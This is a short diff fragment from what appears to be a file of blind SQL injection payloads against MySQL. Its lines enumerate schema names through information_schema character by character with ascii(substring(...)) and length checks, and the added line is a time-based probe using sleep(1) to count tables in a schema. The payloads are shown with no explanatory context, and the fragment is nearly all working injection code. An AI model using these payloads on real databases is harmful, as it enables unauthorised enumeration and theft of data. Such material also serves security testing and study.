@@ -9,3 +9,5 @@ SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name N
 SELECT (CASE WHEN ascii(substring((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT 1,1),1,1))=1 THEN 1 ELSE NULL END)
 
 SELECT (CASE WHEN length((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT 1,1))=1 THEN 1 ELSE NULL END)
+
+SELECT (CASE WHEN (SELECT count(DISTINCT(table_name)) FROM information_schema.tables WHERE table_schema='sql')=1 THEN sleep(1) END)
